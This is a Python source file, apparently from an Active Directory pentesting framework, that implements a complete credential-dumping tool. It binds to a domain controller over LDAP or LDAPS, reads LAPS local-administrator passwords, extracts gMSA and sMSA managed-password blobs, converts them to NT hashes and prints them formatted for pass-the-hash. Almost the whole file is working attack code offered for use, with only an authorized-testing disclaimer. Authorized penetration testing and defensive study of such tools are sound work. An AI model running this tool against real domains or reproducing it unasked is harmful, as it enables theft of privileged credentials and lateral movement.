#!/usr/bin/env python3
"""
Credential Access - Service Password Reader
AD Pentesting Framework - Educational Use Only
Exploits: ReadLAPSPassword, SyncLAPSPassword, ReadGMSAPassword, DumpSMSAPassword
Pure Python — No external tools required

IMPORTANT:
  - LAPS v1/v2  : works over LDAP  (port 389)
  - gMSA / sMSA : requires LDAPS   (port 636) — Windows blocks msDS-ManagedPassword over plain LDAP
"""

import socket
import ssl
import struct
import sys
import re
import signal
import getpass
import hashlib
import time

# ─────────────────────────────────────────────
#  PURE PYTHON MD4 (RFC 1320)
#  Fallback if OpenSSL/hashlib doesn't support md4
# ─────────────────────────────────────────────
def compute_md4(data: bytes) -> str:
    try:
        return hashlib.new('md4', data).hexdigest()
    except Exception:
        pass

    A, B, C, D = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476

    def F(x, y, z): return (x & y) | (~x & z)
    def G(x, y, z): return (x & y) | (x & z) | (y & z)
    def H(x, y, z): return x ^ y ^ z
    def rotl(n, b): return ((n << b) & 0xFFFFFFFF) | (n >> (32 - b))

    orig_len = len(data) * 8
    data += b'\x80'
    while (len(data) % 64) != 56:
        data += b'\x00'
    data += struct.pack('<Q', orig_len)

    for i in range(0, len(data), 64):
        X = list(struct.unpack('<16I', data[i:i + 64]))
        a, b, c, d = A, B, C, D
        for j in range(16):
            k = j
            s = [3, 7, 11, 19][j % 4]
            if   j % 4 == 0: a = rotl((a + F(b, c, d) + X[k]) & 0xFFFFFFFF, s)
            elif j % 4 == 1: d = rotl((d + F(a, b, c) + X[k]) & 0xFFFFFFFF, s)
            elif j % 4 == 2: c = rotl((c + F(d, a, b) + X[k]) & 0xFFFFFFFF, s)
            else:             b = rotl((b + F(c, d, a) + X[k]) & 0xFFFFFFFF, s)
        for j in range(16):
            k = (j % 4) * 4 + (j // 4)
            s = [3, 5, 9, 13][j % 4]
            if   j % 4 == 0: a = rotl((a + G(b, c, d) + X[k] + 0x5A827999) & 0xFFFFFFFF, s)
            elif j % 4 == 1: d = rotl((d + G(a, b, c) + X[k] + 0x5A827999) & 0xFFFFFFFF, s)
            elif j % 4 == 2: c = rotl((c + G(d, a, b) + X[k] + 0x5A827999) & 0xFFFFFFFF, s)
            else:             b = rotl((b + G(c, d, a) + X[k] + 0x5A827999) & 0xFFFFFFFF, s)
        for j in range(16):
            k = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15][j]
            s = [3, 9, 11, 15][j % 4]
            if   j % 4 == 0: a = rotl((a + H(b, c, d) + X[k] + 0x6ED9EBA1) & 0xFFFFFFFF, s)
            elif j % 4 == 1: d = rotl((d + H(a, b, c) + X[k] + 0x6ED9EBA1) & 0xFFFFFFFF, s)
            elif j % 4 == 2: c = rotl((c + H(d, a, b) + X[k] + 0x6ED9EBA1) & 0xFFFFFFFF, s)
            else:             b = rotl((b + H(c, d, a) + X[k] + 0x6ED9EBA1) & 0xFFFFFFFF, s)
        A = (A + a) & 0xFFFFFFFF
        B = (B + b) & 0xFFFFFFFF
        C = (C + c) & 0xFFFFFFFF
        D = (D + d) & 0xFFFFFFFF

    return struct.pack('<4I', A, B, C, D).hex()

# ─────────────────────────────────────────────
#  CTRL+C HANDLER
# ─────────────────────────────────────────────
def handle_exit(sig, frame):
    print_c("\n\n  [!] Interrupted. Exiting safely.", "red")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

# ─────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────
def print_c(text, color="white"):
    colors = {
        "red":    "\033[91m",
        "green":  "\033[92m",
        "yellow": "\033[93m",
        "cyan":   "\033[96m",
        "white":  "\033[97m",
        "blue":   "\033[94m",
        "reset":  "\033[0m",
    }
    print(f"{colors.get(color, '')}{text}{colors['reset']}")

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
BANNER = r"""
 ██████╗██████╗ ███████╗██████╗ ███████╗███╗   ██╗████████╗██╗ █████╗ ██╗     
██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██║██╔══██╗██║     
██║     ██████╔╝█████╗  ██║  ██║█████╗  ██╔██╗ ██║   ██║   ██║███████║██║     
██║     ██╔══██╗██╔══╝  ██║  ██║██╔══╝  ██║╚██╗██║   ██║   ██║██╔══██║██║     
╚██████╗██║  ██║███████╗██████╔╝███████╗██║ ╚████║   ██║   ██║██║  ██║███████╗
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝

      Credential Access Module | Service Password Reader
      ====================================================
      Attacks : LAPS v1 | LAPS v2 | gMSA | sMSA
      Protocol: LDAP (389) for LAPS  |  LDAPS (636) for gMSA/sMSA
      [!] For authorized penetration testing only.
"""

# ─────────────────────────────────────────────
#  VALIDATION
# ─────────────────────────────────────────────
def validate_ip(ip):
    pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split("."))

def validate_domain(domain):
    return bool(re.match(r"^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$", domain))

def domain_to_dn(domain):
    return ','.join(f"DC={part}" for part in domain.split('.'))

# ─────────────────────────────────────────────
#  PING + PORT CHECK
# ─────────────────────────────────────────────
def ping_host(host):
    import subprocess
    print_c(f"\n  [*] Pinging {host}...", "cyan")
    try:
        if sys.platform.startswith("win"):
            # Windows: -n count, -w timeout_ms
            cmd = ["ping", "-n", "2", "-w", "1000", host]
        else:
            # Linux/Mac: -c count, -W timeout_sec
            cmd = ["ping", "-c", "2", "-W", "1", host]
        r = subprocess.run(cmd, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL, timeout=8)
        if r.returncode == 0:
            print_c(f"  [+] Host {host} is reachable.", "green")
            return True
        print_c(f"  [-] Host {host} did not respond to ping.", "yellow")
        return False
    except Exception as e:
        print_c(f"  [!] Ping error: {e}", "red")
        return False

def check_port(ip, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except Exception:
        return False

def verify_target(ip):
    alive = ping_host(ip)
    if not alive:
        cont = input("\n  Host didn't respond to ping. Continue anyway? (yes/no): ").strip().lower()
        if cont not in ("yes", "y"):
            print_c("  [!] Aborting.", "red")
            return False

    print_c("\n  [*] Checking LDAP port 389...", "cyan")
    if check_port(ip, 389):
        print_c("  [+] Port 389 (LDAP) is open.", "green")
    else:
        print_c("  [-] Port 389 (LDAP) appears closed.", "yellow")
        cont = input("  Continue anyway? (yes/no): ").strip().lower()
        if cont not in ("yes", "y"):
            print_c("  [!] Aborting.", "red")
            return False

    print_c("  [*] Checking LDAPS port 636...", "cyan")
    if check_port(ip, 636):
        print_c("  [+] Port 636 (LDAPS) is open. gMSA/sMSA attacks will work.", "green")
    else:
        print_c("  [-] Port 636 (LDAPS) is closed. gMSA/sMSA attacks will be skipped.", "yellow")

    return True

# ─────────────────────────────────────────────
#  PURE PYTHON LDAP CLIENT (LDAP + LDAPS)
# ─────────────────────────────────────────────
class LDAPClient:
    def __init__(self, host, port=389, timeout=10, use_ssl=False):
        self.host    = host
        self.port    = port
        self.timeout = timeout
        self.use_ssl = use_ssl
        self.sock    = None
        self.msg_id  = 1

    # ── BER / ASN.1 helpers ───────────────────

    def _encode_len(self, length):
        if length < 0x80:
            return bytes([length])
        elif length < 0x100:
            return bytes([0x81, length])
        else:
            return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])

    def _tlv(self, tag, value):
        if isinstance(value, str):
            value = value.encode('utf-8')
        return bytes([tag]) + self._encode_len(len(value)) + value

    def _seq(self, *items):
        body = b''.join(items)
        return bytes([0x30]) + self._encode_len(len(body)) + body

    def _int(self, value):
        return self._tlv(0x02, value.to_bytes((value.bit_length() + 8) // 8, 'big'))

    def _str(self, s, tag=0x04):
        return self._tlv(tag, s)

    def _wrap_message(self, msg_id, protocol_op):
        return self._seq(self._int(msg_id), protocol_op)

    # ── Decode helpers ────────────────────────

    def _decode_len(self, data, pos):
        first = data[pos]; pos += 1
        if first < 0x80:
            return first, pos
        n_bytes = first & 0x7F
        length = int.from_bytes(data[pos:pos + n_bytes], 'big')
        return length, pos + n_bytes

    def _decode_tlv(self, data, pos):
        tag = data[pos]; pos += 1
        length, pos = self._decode_len(data, pos)
        value = data[pos:pos + length]
        return tag, value, pos + length

    def _parse_search_result(self, data):
        results = []
        pos = 0
        while pos < len(data):
            try:
                tag, msg_body, pos = self._decode_tlv(data, pos)
                if tag != 0x30:
                    continue
                inner_pos = 0
                _, _, inner_pos = self._decode_tlv(msg_body, inner_pos)
                op_tag = msg_body[inner_pos]
                if op_tag in (0x65, 0x61):   # referral or unbind — skip
                    continue
                if op_tag != 0x64:            # not SearchResultEntry
                    continue
                op_len, inner_pos = self._decode_len(msg_body, inner_pos + 1)
                op_body = msg_body[inner_pos:inner_pos + op_len]

                dn_tag, dn_val, op_pos = self._decode_tlv(op_body, 0)
                dn = dn_val.decode('utf-8', errors='replace')

                attrs = {}
                if op_pos >= len(op_body):
                    results.append({'dn': dn, 'attrs': attrs})
                    continue

                attr_seq_tag, attr_seq_body, _ = self._decode_tlv(op_body, op_pos)
                attr_pos = 0
                while attr_pos < len(attr_seq_body):
                    _, attr_body, attr_pos = self._decode_tlv(attr_seq_body, attr_pos)
                    _, attr_type_val, val_pos = self._decode_tlv(attr_body, 0)
                    attr_name = attr_type_val.decode('utf-8', errors='replace')
                    _, vals_body, _ = self._decode_tlv(attr_body, val_pos)
                    vals = []
                    v_pos = 0
                    while v_pos < len(vals_body):
                        _, val_data, v_pos = self._decode_tlv(vals_body, v_pos)
                        vals.append(val_data)
                    attrs[attr_name] = vals

                results.append({'dn': dn, 'attrs': attrs})
            except Exception:
                break
        return results

    # ── Network ───────────────────────────────

    def connect(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(self.timeout)
        raw.connect((self.host, self.port))
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self.sock = ctx.wrap_socket(raw, server_hostname=self.host)
        else:
            self.sock = raw

    def _send(self, data):
        self.sock.sendall(data)

    def _recv_all(self):
        self.sock.settimeout(5.0)
        buf = b''
        try:
            while True:
                chunk = self.sock.recv(65535)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        return buf

    # ── LDAP Operations ───────────────────────

    def bind(self, username, password, domain):
        bind_dn = f"{username}@{domain}"
        auth = (
            bytes([0x80]) +
            self._encode_len(len(password.encode())) +
            password.encode()
        )
        bind_req = (
            bytes([0x60]) +
            self._encode_len(
                len(self._int(3)) +
                len(self._str(bind_dn)) +
                len(auth)
            ) +
            self._int(3) +
            self._str(bind_dn) +
            auth
        )
        msg = self._wrap_message(self.msg_id, bind_req)
        self.msg_id += 1
        self._send(msg)
        resp = self._recv_all()
        if not resp:
            return False, "No response"
        idx = resp.find(b'\x0a\x01')
        if idx != -1:
            code = resp[idx + 2]
            if code == 0:
                return True, "Bind successful"
            elif code == 49:
                return False, "Invalid credentials (code 49)"
            else:
                return False, f"Bind failed (code {code})"
        return False, "Could not parse bind response"

    def search(self, base_dn, filter_str, attributes):
        filt_enc = self._encode_filter(filter_str)
        attr_list = b''
        for attr in attributes:
            attr_list += self._str(attr)
        attrs_seq = bytes([0x30]) + self._encode_len(len(attr_list)) + attr_list

        scope = bytes([0x0a, 0x01, 0x02])
        deref = bytes([0x0a, 0x01, 0x00])
        size  = bytes([0x02, 0x01, 0x00])
        time_ = bytes([0x02, 0x01, 0x00])
        types = bytes([0x01, 0x01, 0x00])

        body = (
            self._str(base_dn) +
            scope + deref + size + time_ + types +
            filt_enc +
            attrs_seq
        )
        search_req = bytes([0x63]) + self._encode_len(len(body)) + body
        msg = self._wrap_message(self.msg_id, search_req)
        self.msg_id += 1
        self._send(msg)
        time.sleep(0.5)
        resp = self._recv_all()
        if not resp:
            return []
        return self._parse_search_result(resp)

    def _encode_filter(self, filter_str):
        filter_str = filter_str.strip()
        if filter_str.startswith('(') and filter_str.endswith(')'):
            filter_str = filter_str[1:-1]

        if filter_str.startswith('&'):
            inner = self._parse_compound(filter_str[1:])
            enc = b''.join(self._encode_filter(f) for f in inner)
            return bytes([0xa0]) + self._encode_len(len(enc)) + enc

        if filter_str.startswith('|'):
            inner = self._parse_compound(filter_str[1:])
            enc = b''.join(self._encode_filter(f) for f in inner)
            return bytes([0xa1]) + self._encode_len(len(enc)) + enc

        if '=' in filter_str:
            attr, val = filter_str.split('=', 1)
            attr_enc = attr.encode()
            if val == '*':
                return bytes([0x87]) + self._encode_len(len(attr_enc)) + attr_enc
            else:
                val_enc = val.encode()
                inner = self._tlv(0x04, attr_enc) + self._tlv(0x04, val_enc)
                return bytes([0xa3]) + self._encode_len(len(inner)) + inner

        enc = b'objectClass'
        return bytes([0x87]) + self._encode_len(len(enc)) + enc

    def _parse_compound(self, s):
        filters = []
        depth = 0
        start = None
        for i, ch in enumerate(s):
            if ch == '(':
                if depth == 0:
                    start = i
                depth += 1
            elif ch == ')':
                depth -= 1
                if depth == 0 and start is not None:
                    filters.append(s[start:i + 1])
                    start = None
        return filters

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass

# ─────────────────────────────────────────────
#  BLOB PARSER — MSDS-MANAGEDPASSWORD_BLOB
# ─────────────────────────────────────────────
def parse_managed_password_blob(pwd: bytes):
    """
    Parse MSDS-MANAGEDPASSWORD_BLOB and return NT hash string.
    Structure (little-endian):
      0x00  WORD  Version
      0x02  WORD  Reserved
      0x04  DWORD Length
      0x08  WORD  CurrentPasswordOffset
      0x0A  WORD  PreviousPasswordOffset
      0x0C  WORD  QueryPasswordIntervalOffset
      0x0E  WORD  UnchangedPasswordIntervalOffset
      0x10+ data
    CurrentPassword is UTF-16LE; NT hash = MD4(UTF-16LE password)
    """
    if len(pwd) < 20:
        return None, f"Blob too short ({len(pwd)} bytes)"

    version            = struct.unpack_from('<H', pwd, 0x00)[0]
    cur_pwd_offset     = struct.unpack_from('<H', pwd, 0x08)[0]
    prev_pwd_offset    = struct.unpack_from('<H', pwd, 0x0A)[0]
    query_int_offset   = struct.unpack_from('<H', pwd, 0x0C)[0]

    # Current password ends at PreviousPasswordOffset if non-zero,
    # else at QueryPasswordIntervalOffset
    if prev_pwd_offset != 0:
        cur_pwd_end = prev_pwd_offset
    else:
        cur_pwd_end = query_int_offset

    if cur_pwd_offset == 0 or cur_pwd_end <= cur_pwd_offset:
        return None, "Could not determine password boundaries from blob"

    if cur_pwd_end > len(pwd):
        return None, f"Blob offsets out of range (end={cur_pwd_end}, len={len(pwd)})"

    raw_pwd = pwd[cur_pwd_offset:cur_pwd_end]
    nt_hash = compute_md4(raw_pwd)
    return nt_hash, None

# ─────────────────────────────────────────────
#  ATTACK MODULES
# ─────────────────────────────────────────────

def read_laps_password(client, base_dn):
    print_c("\n  ┌─ [1] ReadLAPSPassword ──────────────────────────────┐", "cyan")
    print_c("  │  Searching for ms-Mcs-AdmPwd (LAPS v1) ...         │", "white")
    print_c("  └────────────────────────────────────────────────────┘", "cyan")

    results = client.search(
        base_dn,
        "(ms-Mcs-AdmPwd=*)",
        ["cn", "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime", "distinguishedName"]
    )

    if not results:
        print_c("  [-] No LAPS v1 passwords found (or no permission).", "yellow")
    else:
        for r in results:
            attrs = r['attrs']
            name  = attrs.get('cn', [b'?'])[0]
            pwd   = attrs.get('ms-Mcs-AdmPwd', [b'<hidden>'])[0]
            exp   = attrs.get('ms-Mcs-AdmPwdExpirationTime', [b'?'])[0]
            name  = name.decode('utf-8', errors='replace') if isinstance(name, bytes) else name
            pwd   = pwd.decode('utf-8', errors='replace')  if isinstance(pwd,  bytes) else pwd
            exp   = exp.decode('utf-8', errors='replace')  if isinstance(exp,  bytes) else str(exp)
            print_c(f"\n  [+] Computer  : {name}", "green")
            print_c(f"      DN        : {r['dn']}", "white")
            print_c(f"      Password  : {pwd}", "green")
            print_c(f"      Expires   : {exp}", "white")


def sync_laps_password(client, base_dn):
    print_c("\n  ┌─ [2] SyncLAPSPassword ─────────────────────────────┐", "cyan")
    print_c("  │  Searching for msLAPS-Password (LAPS v2) ...       │", "white")
    print_c("  └────────────────────────────────────────────────────┘", "cyan")

    results = client.search(
        base_dn,
        "(msLAPS-Password=*)",
        ["cn", "msLAPS-Password", "msLAPS-PasswordExpirationTime", "msLAPS-EncryptedPassword"]
    )

    if not results:
        print_c("  [-] No LAPS v2 passwords found (or no permission).", "yellow")
    else:
        for r in results:
            attrs = r['attrs']
            name  = attrs.get('cn', [b'?'])[0]
            pwd   = attrs.get('msLAPS-Password', [b'<encrypted>'])[0]
            enc   = attrs.get('msLAPS-EncryptedPassword', [None])[0]
            name  = name.decode('utf-8', errors='replace') if isinstance(name, bytes) else name
            print_c(f"\n  [+] Computer      : {name}", "green")
            print_c(f"      DN            : {r['dn']}", "white")
            if isinstance(pwd, bytes):
                try:
                    decoded = pwd.decode('utf-16le')
                    print_c(f"      Password Blob : {decoded}", "green")
                except Exception:
                    print_c(f"      Password Blob : {pwd.hex()}", "green")
            if enc:
                print_c(f"      Encrypted Blob: {enc.hex() if isinstance(enc, bytes) else enc}", "yellow")
                print_c("      [!] Encrypted blob requires DPAPI/KDS decryption.", "yellow")


def read_gmsa_password(client, base_dn):
    """
    ReadGMSAPassword — requires LDAPS (port 636).
    Windows will NOT return msDS-ManagedPassword over plain LDAP.
    """
    print_c("\n  ┌─ [3] ReadGMSAPassword ─────────────────────────────┐", "cyan")
    print_c("  │  Searching for gMSA accounts via LDAPS (port 636)  │", "white")
    print_c("  └────────────────────────────────────────────────────┘", "cyan")

    if not client.use_ssl:
        print_c("  [!] This attack requires LDAPS (port 636).", "yellow")
        print_c("      Windows blocks msDS-ManagedPassword over plain LDAP.", "yellow")
        print_c("      Re-run and select LDAPS when prompted.", "yellow")
        return

    results = client.search(
        base_dn,
        "(&(objectClass=msDS-GroupManagedServiceAccount))",
        ["sAMAccountName", "cn", "msDS-ManagedPassword",
         "msDS-ManagedPasswordId", "msDS-GroupMSAMembership",
         "distinguishedName", "pwdLastSet"]
    )

    if not results:
        print_c("  [-] No gMSA accounts found (or no permission).", "yellow")
        return

    for r in results:
        attrs = r['attrs']
        name  = attrs.get('sAMAccountName', attrs.get('cn', [b'?']))[0]
        pwd   = attrs.get('msDS-ManagedPassword', [None])[0]
        name  = name.decode('utf-8', errors='replace') if isinstance(name, bytes) else name

        print_c(f"\n  [+] gMSA Account    : {name}", "green")
        print_c(f"      DN             : {r['dn']}", "white")

        if pwd:
            nt_hash, err = parse_managed_password_blob(pwd)
            if nt_hash:
                print_c(f"      [+] NT Hash     : {nt_hash}", "green")
                print_c(f"      [!] Use for Pass-the-Hash: {name}:::{nt_hash}", "yellow")
            else:
                print_c(f"      [!] Parse error : {err}", "red")
                print_c(f"      Raw Blob (hex)  : {pwd.hex()}", "white")
        else:
            print_c("      [-] msDS-ManagedPassword not returned.", "yellow")
            print_c("      [!] Check: Is this account in PrincipalsAllowedToRetrieveManagedPassword?", "yellow")


def dump_smsa_password(client, base_dn):
    """
    DumpSMSAPassword — requires LDAPS (port 636).
    """
    print_c("\n  ┌─ [4] DumpSMSAPassword ─────────────────────────────┐", "cyan")
    print_c("  │  Searching for sMSA accounts via LDAPS (port 636)  │", "white")
    print_c("  └────────────────────────────────────────────────────┘", "cyan")

    if not client.use_ssl:
        print_c("  [!] This attack requires LDAPS (port 636).", "yellow")
        print_c("      Windows blocks msDS-ManagedPassword over plain LDAP.", "yellow")
        print_c("      Re-run and select LDAPS when prompted.", "yellow")
        return

    results = client.search(
        base_dn,
        "(&(objectClass=msDS-ManagedServiceAccount))",
        ["cn", "sAMAccountName", "msDS-HostServiceAccount",
         "msDS-ManagedPassword", "msDS-ManagedPasswordId",
         "distinguishedName", "pwdLastSet"]
    )

    if not results:
        print_c("  [-] No sMSA accounts found.", "yellow")
        return

    for r in results:
        attrs = r['attrs']
        name  = attrs.get('sAMAccountName', attrs.get('cn', [b'?']))[0]
        host  = attrs.get('msDS-HostServiceAccount', [b'N/A'])[0]
        pwd   = attrs.get('msDS-ManagedPassword', [None])[0]
        name  = name.decode('utf-8', errors='replace') if isinstance(name, bytes) else name
        host  = host.decode('utf-8', errors='replace') if isinstance(host, bytes) else str(host)

        print_c(f"\n  [+] sMSA Account    : {name}", "green")
        print_c(f"      DN             : {r['dn']}", "white")
        print_c(f"      Linked Host    : {host}", "white")

        if pwd:
            nt_hash, err = parse_managed_password_blob(pwd)
            if nt_hash:
                print_c(f"      [+] NT Hash     : {nt_hash}", "green")
                print_c(f"      [!] Use for Pass-the-Hash: {name}:::{nt_hash}", "yellow")
            else:
                print_c(f"      [!] Parse error : {err}", "red")
                print_c(f"      Raw Blob (hex)  : {pwd.hex()}", "white")
        else:
            print_c("      [-] msDS-ManagedPassword not returned.", "yellow")
            print_c("      [!] Requires local admin on linked host or explicit delegation.", "yellow")

# ─────────────────────────────────────────────
#  INPUT GATHERING
# ─────────────────────────────────────────────
def gather_inputs():
    print_c("\n  ┌─ Target Configuration ──────────────────────────────┐", "yellow")

    while True:
        domain = input("\n  [+] Domain (e.g. cs.org): ").strip()
        if validate_domain(domain):
            break
        print_c("  [!] Invalid domain. Example: cs.org", "red")

    while True:
        username = input("  [+] Username: ").strip()
        if username:
            break
        print_c("  [!] Username cannot be empty.", "red")

    password = getpass.getpass("  [+] Password: ")

    while True:
        ip = input("  [+] DC IP address: ").strip()
        if validate_ip(ip):
            break
        print_c("  [!] Invalid IP. Example: 192.168.1.41", "red")

    print_c("  └────────────────────────────────────────────────────┘\n", "yellow")
    return domain, username, password, ip


def select_protocol():
    print_c("\n  ┌─ Protocol Selection ───────────────────────────────┐", "yellow")
    print_c("  │  [1] LDAP  (port 389) — LAPS only                  │", "white")
    print_c("  │  [2] LDAPS (port 636) — All attacks incl. gMSA/sMSA│", "white")
    print_c("  └────────────────────────────────────────────────────┘\n", "yellow")
    while True:
        choice = input("  Select [1-2]: ").strip()
        if choice in ("1", "2"):
            return choice == "2"
        print_c("  [!] Enter 1 or 2.", "red")


def select_attacks():
    print_c("\n  ┌─ Select Attacks ────────────────────────────────────┐", "yellow")
    print_c("  │  [1] ReadLAPSPassword   — LAPS v1 plaintext         │", "white")
    print_c("  │  [2] SyncLAPSPassword   — LAPS v2 encrypted blob    │", "white")
    print_c("  │  [3] ReadGMSAPassword   — Group MSA NT hash (LDAPS) │", "white")
    print_c("  │  [4] DumpSMSAPassword   — Standalone MSA  (LDAPS)   │", "white")
    print_c("  │  [5] All attacks                                     │", "white")
    print_c("  └────────────────────────────────────────────────────┘\n", "yellow")
    while True:
        choice = input("  Select [1-5]: ").strip()
        if choice in ("1", "2", "3", "4", "5"):
            return choice
        print_c("  [!] Enter a number between 1 and 5.", "red")

# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def main():
    print_c(BANNER, "cyan")
    print_c("  [!] DISCLAIMER: Use only on systems you own or have", "yellow")
    print_c("      explicit written permission to test.\n", "yellow")

    try:
        confirm = input("  Continue? (yes/no): ").strip().lower()
    except EOFError:
        handle_exit(None, None)

    if confirm not in ("yes", "y"):
        print_c("\n  [*] Aborted.", "red")
        sys.exit(0)

    domain, username, password, ip = gather_inputs()

    if not verify_target(ip):
        sys.exit(0)

    use_ssl = select_protocol()
    port    = 636 if use_ssl else 389
    base_dn = domain_to_dn(domain)
    choice  = select_attacks()

    proto_label = "LDAPS (636)" if use_ssl else "LDAP (389)"
    print_c(f"\n  [*] Connecting to {proto_label} on {ip} ...", "cyan")

    client = LDAPClient(ip, port=port, use_ssl=use_ssl)
    try:
        client.connect()
        print_c(f"  [+] TCP{'S' if use_ssl else ''} connection established.", "green")
    except Exception as e:
        print_c(f"  [!] Could not connect: {e}", "red")
        if use_ssl:
            print_c("  [!] LDAPS may not be configured on the DC.", "yellow")
            print_c("      On DC run: certutil -pulse  (to auto-enroll a cert)", "yellow")
        sys.exit(1)

    print_c(f"  [*] Binding as {username}@{domain} ...", "cyan")
    ok, msg = client.bind(username, password, domain)
    if not ok:
        print_c(f"  [-] Bind failed: {msg}", "red")
        client.close()
        sys.exit(1)
    print_c(f"  [+] {msg}", "green")
    print_c(f"  [*] Base DN: {base_dn}\n", "white")

    if choice in ("1", "5"):
        read_laps_password(client, base_dn)
    if choice in ("2", "5"):
        sync_laps_password(client, base_dn)
    if choice in ("3", "5"):
        read_gmsa_password(client, base_dn)
    if choice in ("4", "5"):
        dump_smsa_password(client, base_dn)

    client.close()
    print_c("\n  [✓] Credential access module complete.\n", "green")


if __name__ == "__main__":
    main()
